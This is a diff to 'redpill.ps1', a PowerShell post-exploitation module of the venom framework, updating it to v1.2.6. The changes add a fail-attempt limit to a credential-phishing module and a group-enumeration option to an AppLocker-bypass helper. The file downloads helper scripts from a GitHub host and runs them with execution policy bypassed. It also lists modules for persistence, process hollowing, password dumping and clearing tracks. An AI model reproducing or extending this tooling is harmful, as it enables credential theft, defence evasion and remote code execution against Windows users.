@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (18363) x64 bits
    Required Dependencies: none
    Optional Dependencies: BitsTransfer
-   PS cmdlet Dev version: v1.2.5
+   PS cmdlet Dev version: v1.2.6
 
 .DESCRIPTION
    This cmdlet belongs to the structure of venom v1.0.17.8 as a post-exploitation module.
@@ -84,8 +84,8 @@
    [string]$Extension="false", [string]$FilePath="false",
    [string]$MetaData="false", [int]$ButtonType='0',
    [int]$SPort='8080', [string]$PEHollow="false",
+   [int]$Limmit='5', [string]$AppLocker="false",
    [string]$Domain="www.facebook.com",
-   [string]$AppLocker="false",
    [string]$ToIPaddr="false",
    [string]$DnsSpoof="false",
    [string]$Sponsor="false"
@@ -93,7 +93,7 @@
 
 
 ## Var declarations
-$CmdletVersion = "v1.2.5"
+$CmdletVersion = "v1.2.6"
 $Remote_hostName = hostname
 $OsVersion = [System.Environment]::OSVersion.Version
 $Working_Directory = pwd|Select-Object -ExpandProperty Path
@@ -159,7 +159,7 @@ $ListParameters = @"
   -Upload           script.ps1           Upload script.ps1 from attacker apache2 webroot
   -Persiste         `$Env:TMP\script.ps1  Persiste script.ps1 on every startup {BeaconHome}
   -CleanTracks      Clear|Paranoid       Clean disk artifacts left behind {clean system tracks}
-  -AppLocker        Enum                 Enumerate AppLocker Directorys with weak permissions
+  -AppLocker        Enum|WhoAmi          Enumerate AppLocker Directorys with weak permissions
   -FileMace         `$Env:TMP\test.txt    Change File Mace {CreationTime,LastAccessTime,LastWriteTime}
   -MetaData         `$Env:TMP\test.exe    Display files \ applications description (metadata)
   -PEHollow         `$Env:TMP\test.exe    PE Process Hollowing {impersonate explorer.exe as parent}
@@ -204,7 +204,7 @@ If($Sysinfo -ieq "Enum" -or $Sysinfo -ieq "Verbose"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/sysinfo.ps1 -Destination $Env:TMP\Sysinfo.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\Sysinfo.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 14){## Corrupted download detected => DefaultFileSize: 14,841796875/KB
+      If($SizeDump -lt 15){## Corrupted download detected => DefaultFileSize: 15,0107421875/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\Sysinfo.ps1"){Remove-Item -Path "$Env:TMP\Sysinfo.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -357,7 +357,7 @@ If($GetBrowsers -ieq "Enum" -or $GetBrowsers -ieq "Verbose"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/EnumBrowsers.ps1 -Destination $Env:TMP\EnumBrowsers.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\EnumBrowsers.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 4){## Corrupted download detected => DefaultFileSize: 4,4736328125/KB
+      If($SizeDump -lt 4){## Corrupted download detected => DefaultFileSize: 4,537109375/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\EnumBrowsers.ps1"){Remove-Item -Path "$Env:TMP\EnumBrowsers.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -432,7 +432,7 @@ If($GetProcess -ieq "Enum" -or $GetProcess -ieq "Kill"){
       Id              : 5684
       Name            : powershell
       Description     : Windows PowerShell
-      MainWindowTitle : @redpill v1.2.5 {SSA@RedTeam}
+      MainWindowTitle : @redpill v1.2.6 {SSA@RedTeam}
       ProductVersion  : 10.0.18362.1
       Path            : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
       Company         : Microsoft Corporation
@@ -1050,13 +1050,24 @@ If($PhishCreds -ieq "Start"){
       process and leaks the credentials on this terminal shell (Social Engineering).
 
    .NOTES
-      Remark: CredsPhish.ps1 CmdLet its set for 30 fail validations before abort.
+      Remark: CredsPhish.ps1 CmdLet its set for 5 fail validations before abort.
       Remark: CredsPhish.ps1 CmdLet requires lmhosts + lanmanserver services running.
       Remark: On Windows <= 10 lmhosts and lanmanserver are running by default.
+
+   .Parameter PhishCreds
+      Accepts Start @argument {start phishing}
+
+   .Parameter Limmit
+      Aborts phishing after -Limmit [fail attempts] reached.
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -PhishCreds Start
       Prompt the current user for a valid credential.
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -PhishCreds Start -Limmit 30
+      Prompt the current user for a valid credential and
+      Abort phishing after -Limmit [number] fail attempts.
 
    .OUTPUTS
       Captured Credentials (logon)
@@ -1074,8 +1085,8 @@ If($PhishCreds -ieq "Start"){
 
    ## Check for file download integrity (fail/corrupted downloads)
    $CheckInt = Get-Content -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue
-   $SizeDump = ((Get-Item -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue).length/1KB) ## DefaultFileSize: 7,994140625/KB
-   If(-not(Test-Path -Path "$Env:TMP\CredsPhish.ps1") -or $SizeDump -lt 7 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
+   $SizeDump = ((Get-Item -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue).length/1KB) ## DefaultFileSize: 10,291015625/KB
+   If(-not(Test-Path -Path "$Env:TMP\CredsPhish.ps1") -or $SizeDump -lt 10 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
       ## Fail to download Sherlock.ps1 using BitsTransfer OR the downloaded file is corrupted
       Write-Host "[abort] fail to download CredsPhish.ps1 using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
       #If(Test-Path -Path "$Env:TMP\CredsPhish.ps1"){Remove-Item -Path "$Env:TMP\CredsPhish.ps1" -Force}
@@ -1083,8 +1094,13 @@ If($PhishCreds -ieq "Start"){
    }
 
    ## Start Remote Host CmdLet
-   powershell -exec bypass -NonInteractive -NoLogo -File $Env:TMP\CredsPhish.ps1
+   # Start-Process -WindowStyle hidden powershell -ArgumentList "-exec bypass", "-NonInteractive", "-NoLogo", "-File $Env:TMP\CredsPhish.ps1 -PhishCreds Start -Limmit $Limmit" -ErrorAction SilentlyContinue|Out-Null 
+   powershell -exec bypass -NonInteractive -NoLogo -File "$Env:TMP\CredsPhish.ps1" -PhishCreds Start -Limmit $Limmit
    Write-Host "";Start-Sleep -Seconds 1
+
+   ## Clean Old files left behind
+   If(Test-Path -Path "$Env:TMP\CredsPhish.ps1"){Remove-Item -Path "$Env:TMP\CredsPhish.ps1" -Force}
+
 }
 
 If($GetPasswords -ieq "Enum" -or $GetPasswords -ieq "Dump"){
@@ -1140,7 +1156,7 @@ If($GetPasswords -ieq "Enum" -or $GetPasswords -ieq "Dump"){
 
    ## Run auxiliary module
    If($GetPasswords -ieq "Enum"){
-      powershell -File "$Env:TMP\GetPasswords.ps1" -GetPasswords Enum -StartDir $StartDir
+      powershell -File "$Env:TMP\GetPasswords.ps1" -GetPasswords Enum -StartDir "$StartDir"
    }ElseIf($GetPasswords -ieq "Dump"){
       powershell -File "$Env:TMP\GetPasswords.ps1" -GetPasswords Dump
    }
@@ -1879,17 +1895,25 @@ If($PEHollow -ne "false"){
 }
 
 
-if($AppLocker -ieq "Enum"){
+if($AppLocker -ieq "Enum" -or $AppLocker -ieq "WhoAmi"){
 
    <#
    .SYNOPSIS
-      Enumerate directorys with weak permissions (bypass applocker)
+      Author: @r00t-3xp10it
+      Helper - Enumerate directorys with weak permissions (bypass applocker)
+
+   .Parameter AppLocker
+      Accepts: Enum and WhoAmi @arguments
 
    .Parameter FolderRigths
       Accepts permissions: Modify, Write, FullControll
 
    .Parameter GroupName
       Accepts GroupNames: Everyone, BUILTIN\Users, NT AUTHORITY\INTERACTIVE
+
+   .EXAMPLE
+      PS C:\> Powershell -File redpill.ps1 -AppLocker WhoAmi
+      Enumerate ALL Group Names available on local machine
 
    .EXAMPLE
       PS C:\> Powershell -File redpill.ps1 -AppLocker Enum -GroupName "BUILTIN\Users" -FolderRigths "Write"
@@ -1902,7 +1926,6 @@ if($AppLocker -ieq "Enum"){
    .OUTPUTS
       AppLocker - Weak Directory permissions
       --------------------------------------
-
       VulnId            : 1::ACL (Mitre T1222)
       FolderPath        : C:\WINDOWS\tracing
       FileSystemRights  : Write
@@ -1919,7 +1942,7 @@ if($AppLocker -ieq "Enum"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/AppLocker.ps1 -Destination $Env:TMP\AppLocker.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\AppLocker.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 5){## Corrupted download detected => DefaultFileSize: 5,60546875/KB
+      If($SizeDump -lt 8){## Corrupted download detected => DefaultFileSize: 8,21484375/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\AppLocker.ps1"){Remove-Item -Path "$Env:TMP\AppLocker.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -1927,7 +1950,11 @@ if($AppLocker -ieq "Enum"){
    }
 
    ## Run auxiliary module
-   powershell -File "$Env:TMP\AppLocker.ps1" -GroupName "$GroupName" -FolderRigths "$FolderRigths"
+   If($AppLocker -ieq "WhoAmi"){
+       powershell -File "$Env:TMP\AppLocker.ps1" -WhoAmi Groups
+   }ElseIf($AppLocker -ieq "Enum"){
+       powershell -File "$Env:TMP\AppLocker.ps1" -GroupName "$GroupName" -FolderRigths "$FolderRigths"
+   }
 
    ## Clean Old files left behind
    If(Test-Path -Path "$Env:TMP\AppLocker.ps1"){Remove-Item -Path "$Env:TMP\AppLocker.ps1" -Force}
@@ -2171,7 +2198,7 @@ $HelpParameters = @"
       Id              : 5684
       Name            : powershell
       Description     : Windows PowerShell
-      MainWindowTitle : @redpill v1.2.5 {SSA@RedTeam}
+      MainWindowTitle : @redpill v1.2.6 {SSA@RedTeam}
       ProductVersion  : 10.0.18362.1
       Path            : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
       Company         : Microsoft Corporation
@@ -2494,13 +2521,23 @@ $HelpParameters = @"
       process and leaks the credentials on this terminal shell (Social Engineering).
 
    .NOTES
-      Remark: CredsPhish.ps1 CmdLet its set for 30 fail validations before abort.
+      Remark: CredsPhish.ps1 CmdLet its set for 5 fail validations before abort.
       Remark: CredsPhish.ps1 CmdLet requires lmhosts + lanmanserver services running.
       Remark: On Windows <= 10 lmhosts and lanmanserver are running by default.
+
+   .Parameter PhishCreds
+      Accepts Start @argument {start phishing}
+
+   .Parameter Limmit
+      Aborts phishing after -Limmit [fail attempts] reached.
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -PhishCreds Start
       Prompt the current user for a valid credential.
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -PhishCreds Start -Limmit 30
+      Prompt the current user for a valid creds and Abort after -Limmit [fail attempts].
 
    .OUTPUTS
       Captured Credentials (logon)
@@ -3063,6 +3100,9 @@ $HelpParameters = @"
       Author: @r00t-3xp10it
       Helper - Enumerate directorys with weak permissions (bypass applocker)
 
+   .Parameter AppLocker
+      Accepts: Enum and WhoAmi @arguments
+
    .Parameter FolderRigths
       Accepts permissions: Modify, Write, FullControll
 
@@ -3070,12 +3110,12 @@ $HelpParameters = @"
       Accepts GroupNames: Everyone, BUILTIN\Users, NT AUTHORITY\INTERACTIVE
 
    .EXAMPLE
-      PS C:\> Powershell -File redpill.ps1 -AppLocker Enum 
-      Enumerate directorys owned by 'BUILTIN\Users' GroupName with 'Write' permissions (default)
+      PS C:\> Powershell -File redpill.ps1 -AppLocker WhoAmi
+      Enumerate ALL Group Names available on local machine
 
    .EXAMPLE
-      PS C:\> Powershell -File redpill.ps1 -AppLocker Enum -GroupName "Everyone" -FolderRigths "Write"
-      Enumerate directorys owned by 'Everyone' GroupName with 'Write' permissions
+      PS C:\> Powershell -File redpill.ps1 -AppLocker Enum -GroupName "BUILTIN\Users" -FolderRigths "Write"
+      Enumerate directorys owned by 'BUILTIN\Users' GroupName with 'Write' permissions
 
    .EXAMPLE
       PS C:\> Powershell -File redpill.ps1 -AppLocker Enum -GroupName "Everyone" -FolderRigths "FullControl"
@@ -3084,7 +3124,6 @@ $HelpParameters = @"
    .OUTPUTS
       AppLocker - Weak Directory permissions
       --------------------------------------
-
       VulnId            : 1::ACL (Mitre T1222)
       FolderPath        : C:\WINDOWS\tracing
       FileSystemRights  : Write
